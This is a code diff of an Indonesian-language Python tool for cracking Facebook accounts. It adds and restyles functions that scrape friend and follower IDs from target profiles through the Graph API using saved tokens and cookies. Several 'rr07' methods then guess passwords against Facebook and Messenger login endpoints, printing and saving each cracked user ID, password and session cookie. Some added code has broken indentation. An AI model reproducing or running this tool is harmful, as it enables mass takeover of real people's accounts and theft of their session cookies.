@@ -413,7 +413,7 @@ def login_menu():
              {H2}╰─▶ {B2}03 [bold purple]Clone ID Email  {H2}╰─▶ {B2}00 [bold purple]Exit Program""")
     ___Sllowly_ID____ = input(f'✶ ━━⫸ {H} Input{N} : ')
     if ___Sllowly_ID____ in ['1']:
-        massal()
+        Dump_Massal()
     elif ___Sllowly_ID____ in ['2']:
         print(nel(f'\t\t [bold blue]Publik Crack',width=90, padding=(0, 8), style=f"bold purple"))
         idt = input(f'\n✶ ━━⫸ {H2} Masukkan ID Target  : {m}')
@@ -437,6 +437,65 @@ def error():
 	print(f'{k}>> {m}Maaf Fitur Ini Masih Di Perbaiki {x}')
 	time.sleep(4)
 	back()
+#-------------------[MASSAL]--------------------#    
+    def massalr():
+		try:cok = open('.cok.txt','r').read();tok = open('.token.txt','r').read()
+		except FileNotFoundError:self.login()
+		try:jml = int(input(f" {P}[{H}?{P}] {U2}masukan jumlah {H}id {P}yang anda inginkan :{H} "))
+		except ValueError:exit(f" {P}[{M}!{P}] masukan angka jangan huruf")
+		for jid in range(jml):
+			jid += 1
+			user = input(f" {P}[{H}+{P}] masukan id \x1b[1;90m({H}{str(jid)}\x1b[1;90m){P}:{H} ")
+			self.uid["userid"].append(user)
+		print (f"\n {P}[{H}+{P}] {P}Nama File Untuk Dump Id \x1b[1;90m({P}Contoh {H}/sdcard/dumpfb.txt\x1b[1;90m)")
+		files = input(f" {P}[{K}?{P}] Nama File:{H} ")
+		save = open(files,'w')
+		for userid in self.uid["userid"]:
+			try:
+				response = self.Xyz.get(f'https://graph.facebook.com/{userid}?fields=friends&access_token={tok}',cookies={'cookie': cok})
+				for teman in response.json()['friends']['data']:
+					try:
+						save.write(teman["id"]+'|'+teman["name"]+'\n')
+						self.uid["total"].append(teman["id"]+'|'+teman["name"])
+					except:continue
+					sys.stdout.write(f"\r\r {P}[{U}-{P}] Sedang mengumpulkan id {H}{len(self.uid['total'])}");sys.stdout.flush()
+			except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
+			except (KeyError,IOError):pass
+		print ("\r")
+		print (f"\n {P}[{H}+{P}] Total id: {H}{len(self.uid['total'])} {P}id")
+		print (f" {P}[{H}✓{P}] File tersimpan di: {H}{files}")
+		input(f" {P}[{O}•{P}] klik enter untuk kembali ke {H}menu");sleep(2);self.Check()
+#-------------------[PUBLIK]--------------------#    
+	def publikr():
+		try:cok = open('.cok.txt','r').read();tok = open('.token.txt','r').read()
+		except FileNotFoundError:self.login()
+		user = input(f" {P}[{H}+{P}]{U} masukan id {P}:{H} ")
+		try:
+			response = self.Xyz.get(f'https://graph.facebook.com/{user}?fields=friends&access_token={tok}',cookies={'cookie': cok})
+			for teman in response.json()['friends']['data']:
+				try:
+					self.uid["userid"].append(teman["id"])
+				except:continue
+		except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
+		except (KeyError,IOError):sleep(2);exit(f" {P}[{M}!{P}] id tidak publik")
+		print (f"\n {P}[{H}+{P}] {P}Nama File Untuk Dump Id \x1b[1;90m({P}Contoh {H}/sdcard/dumpfb.txt\x1b[1;90m)")
+		files = input(f" {P}[{K}?{P}] Nama File:{H} ")
+		save = open(files,'w')
+		for userid in self.uid["userid"]:
+			try:
+				response = self.Xyz.get(f'https://graph.facebook.com/{userid}?fields=friends&access_token={tok}',cookies={'cookie': cok})
+				for teman in response.json()['friends']['data']:
+					try:
+						save.write(teman["id"]+'|'+teman["name"]+'\n')
+						self.uid["total"].append(teman["id"]+'|'+teman["name"])
+					except:continue
+					sys.stdout.write(f"\r\r {P}[{U}-{P}] Sedang mengumpulkan id {H}{len(self.uid['total'])}");sys.stdout.flush()
+			except requests.exceptions.ConnectionError:sleep(2);exit(f" {P}[{M}!{P}] silahkan check koneksi {H}internet {P}anda")
+			except (KeyError,IOError):pass
+		print ("\r")
+		print (f"\n {P}[{H}+{P}] Total id: {H}{len(self.uid['total'])} {P}id")
+		print (f" {P}[{H}✓{P}] File tersimpan di: {H}{files}")
+		input(f" {P}[{O}•{P}] klik enter untuk kembali ke {H}menu");sleep(2);setting()
 #-------------------[PUBLIK]--------------------#    
 def dump(idt,fields,cookie,token):
 	try:
@@ -468,145 +527,6 @@ def dump(idt,fields,cookie,token):
 			#print(i["id"]+"|"+i["name"])
 			id.append(i["id"]+"|"+i["name"])
 			sys.stdout.write(f"\r>> {M}sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
-			sys.stdout.flush()
-		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
-	except:pass
-
-###-----[ DUMP OTOMATIS ]-----###
-def dump1(idt,fields,cookie,token):
-	try:
-		headers = {
-			"connection": "keep-alive", 
-			"accept": "*/*", 
-			"sec-fetch-dest": "empty", 
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "same-origin", 
-			"sec-fetch-user": "?1",
-			"sec-ch-ua-mobile": "?1",
-			"upgrade-insecure-requests": "1", 
-			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
-			"accept-encoding": "gzip, deflate",
-			"accept-language": "id-ID,id;q=0.9"
-		}
-		if len(id) == 0:
-			params = {
-				"access_token": token,
-				"fields": f"name,friends.fields(id,name,birthday)"
-			}
-		else:
-			params = {
-				"access_token": token,
-				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
-			}
-		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
-		for i in url["friends"]["data"]:
-			#print(i["id"]+"|"+i["name"])
-			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
-			sys.stdout.flush()
-		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
-	except:pass
-#-------------------[ CRACK-PUBLIK2 ]----------------#
-def dump2():
-	with requests.Session() as ses:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-		a = input(f'✶ ━━⫸ {H2} ID Target{x} : ')
-		try:
-			params = {
-			"access_token": token, 
-			"fields": "name,friends.fields(id,name,birthday)"
-			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-			print(' : {}'.format(len(id)));setting()
-		except Exception as e:
-			print(e)
-#-------------------[ CRACK-PUBLIK3 ]----------------#
-def dump3():
-	print("")
-	x=f"\t\t{P2}Target harus public & banyak friends nya"
-	rprint(panel(x,style=f"bold purple"))
-	x=f"\t\t{P2}ketik {H2}Me{P2} untuk crack dari pertemanan"
-	rprint(panel(x,style=f"bold purple"))
-	put = input(f" Target id public :"+H+" ")
-	try:
-		token = open('token.txt','r').read()
-		cookie = open('cok.txt','r').read()
-		coki = {"cookie":cok}
-		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
-		el = json.loads(coa.text)
-		try:lk = el["name"]
-		except (KeyError,IOError):
-			lk = M+"-"+P
-		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
-		#print(f" Mengambil ID Teman"+H+": "+nama["name"])
-		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
-		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
-		#try:
-			#Hikmat = link["data"]
-			#ttl__ = []
-			#ttl__.append("\033[96;1m + TTL")
-		#except:
-			#pass
-		#if len(link["data"]) == 0:
-			#print(M+"\n [x] Tidak Bisa Mengakses Data: "+K+nama["name"])
-			#print(M+" [x] Coba cari Akun yg lainnya!")
-			#exit()
-		#global ttl__
-		token = open('token.txt','r').read()
-		cookie = open('cok.txt','r').read()
-		coki = {"cookie":cookie}
-		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
-		for fuck in cyna['friends']['data']:
-			try:id.append(fuck['id']+'|'+fuck['name'])
-			except:continue
-		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
-		for fak in cini['subscribers']['data']:
-			try:id3.append(fak['id']+'|'+fak['name'])
-			except:continue
-		#print(f" nama target :%s %s"(H,lk))
-		x=f"{P2}Nama target : {H2}{lk}\n{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
-		rprint(panel(x,style=f"bold purple"))
-		setting()
-	except requests.exceptions.ConnectionError:
-		jalan(" koneksi internet bermasalah ")
-		exit()
-	except (KeyError,IOError):
-		jalan(" gagal dump id... mungkin privat friends/gada friends nya") 
-		login_menu()
-#------------------[ CRACK-PUBLIK ]-----------------#
-def dump4(idt,fields,cookie,token):
-	try:
-		headers = {
-			"connection": "keep-alive", 
-			"accept": "*/*", 
-			"sec-fetch-dest": "empty", 
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "same-origin", 
-			"sec-fetch-user": "?1",
-			"sec-ch-ua-mobile": "?1",
-			"upgrade-insecure-requests": "1", 
-			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
-			"accept-encoding": "gzip, deflate",
-			"accept-language": "id-ID,id;q=0.9"
-		}
-		if len(id) == 0:
-			params = {
-				"access_token": token,
-				"fields": f"name,friends.fields(id,name,birthday)"
-			}
-		else:
-			params = {
-				"access_token": token,
-				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
-			}
-		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
-		for i in url["friends"]["data"]:
-			#print(i["id"]+"|"+i["name"])
-			id.append(i["id"]+"|"+i["name"])
-			sys.stdout.write(f"\r'✶ ━━⫸ {H2}SUKSES MENGUMPULKAN{h} {len(id)}{P} ID{P}"),
 			sys.stdout.flush()
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
@@ -901,13 +821,13 @@ def Dump_Massal():
 	except IOError:
 		exit()
 	try:
-		print(f"\n>>> pastikan id target tidak private/publik.")
-		jum = int(input(f'>>> input jumlah target ? : '))
+		print(f"\n{U2} pastikan id target tidak private/publik.")
+		jum = int(input(f'{U2} input jumlah target ? : '))
 	except ValueError:
 		print(f'>>> input salah ')
 		exit()
 	if jum<1 or jum>100:
-		print(f'>>> gagal dump id kemungkinan id bukan publik/private ')
+		print(f'{U2} gagal dump id kemungkinan id bukan publik/private ')
 		exit()
 	ses=requests.Session()
 	jumlah_input = 0
@@ -937,7 +857,7 @@ def Dump_Massal():
 		back()
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
-	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{M2} ID TELAH DIKUMPULKAN", style=f"bold purple"))
+	cetak(nel(f"                        [bold blue]login ID Crack", title=f"{asu}{len(id)}{B} ID TELAH DIKUMPULKAN", style=f"bold purple"))
 	print(f"{H2}╰─▶ {B2}01 [bold purple]Facebook ID {M2}Old\n")
 	print(f"{H2}╰─▶ {B2}02 [bold purple]Facebook ID {K2}New\n")
 	print(f"{H2}╰─▶ {B2}03 [bold purple]Facebook ID {H2}Random\n")
@@ -1068,7 +988,7 @@ def rr071(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
-	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1102,19 +1022,19 @@ def rr071(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{idf}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{idf}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1127,7 +1047,7 @@ def rr072(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
-	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1145,16 +1065,16 @@ def rr072(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{idf}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{idf}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1170,7 +1090,7 @@ def rr072(idf,pwv):
 def rr073(idf,pwv):
 	global loop,ok,cp
 	ua = random.choice(ugen)
-	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{idf}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1203,19 +1123,19 @@ def rr073(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{idf}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{idf}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1225,7 +1145,7 @@ def rr073(idf,pwv):
 ###-----[ METODE VALIDATE ]-----###
 def rr074(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1239,17 +1159,17 @@ def rr074(uid,pwv):
 			if "c_user" in ses.cookies.get_dict():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				break
 			else:
@@ -1260,7 +1180,7 @@ def rr074(uid,pwv):
 ###-----[ METODE ASYNC ]-----###
 def rr075(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1276,17 +1196,17 @@ def rr075(uid,pwv):
 			if "c_user" in ses.cookies.get_dict():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				break
 			else:
@@ -1297,7 +1217,7 @@ def rr075(uid,pwv):
 ###-----[ METODE API ]-----###
 def rr076(uid,pwv):
 	global loop,ok,cp,a2f
-	sys.stdout.write(f"\r[{bo}RR07 v6{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v6{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1315,17 +1235,17 @@ def rr076(uid,pwv):
 				for x in coki:
 					cok.update({x["name"]:x["value"]})
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif 'www.facebook.com' in response.json()['error_msg']:
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				break
 			elif 'Login approvals' in response.json()['error_msg']:
@@ -1340,7 +1260,7 @@ def rr076(uid,pwv):
 ###-----[ METODE MESSENGER ]-----###
 def rr077(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{idf}{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}] [{U}CP-{x}:{K}{cp}] [Crack-:{bo}{uid}{x}]"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	while True:
@@ -1393,17 +1313,17 @@ def rr077(uid,pwv):
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
 			if "c_user" in ses.cookies.get_dict():
 				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{H2}{kuki}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{H2}{kuki}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				ok +=1
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
-				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
-				print(f"\r{H2} ╰─▶{U}{ua}")
+				print(f"\r{H2}⫸{B2} ✶{P2} User Id : {B2}{uid}")
+				print(f"\r{H2}⫸{B2} ✶{P2} Password : {H2}{pw}")
+				print(f"\r{H2}╰─▶{P2}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				cp+=1
 				break
@@ -1505,6 +1425,12 @@ def run():
                 clear()
                 login_menu()
     except (IOError,FileNotFoundError):
+       banner()
+       print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
+       loading()
+       clear()
+       banner()
+       print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
        license_key = input(f"[{h}•{x}]{U}Masukkan lisensi{x}:{B} ")
        licen=open(".saved_license.txt", "w").write(license_key)
        time.sleep(0.03)
@@ -1516,13 +1442,23 @@ def run():
           clear()
           banner()
           print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
+          saved_license = file.read()
+          expiration_date = get_expiration_date(saved_license)
           print(f"[bold green]Lisensi kadaluwarsa pada tanggal: {B2}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
-          print(f"[bold green]Lisensi valid. Selamat menggunakan program.")
-          time.sleep(3)
+          if saved_license and is_license_valid(saved_license):
+              time.sleep(0.03)
+              print(f"[bold green]Lisensi valid. Selamat menggunakan program.")
+              time.sleep(3)
+              loading()
+              clear()
+              login_menu()
+       else:
+          banner()
+          print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
           loading()
           clear()
-          login_menu()
-       else:
+          banner()
+          print(nel(" "* spasi_awal + pesan_selamat, style=f"bold purple"))
           os.system("rm -f .saved_license.txt")
           print(f"{m}Lisensi tidak valid atau telah kadaluarsa. Tolong masukan lisensi dengan benar.")
           time.sleep(0.03)
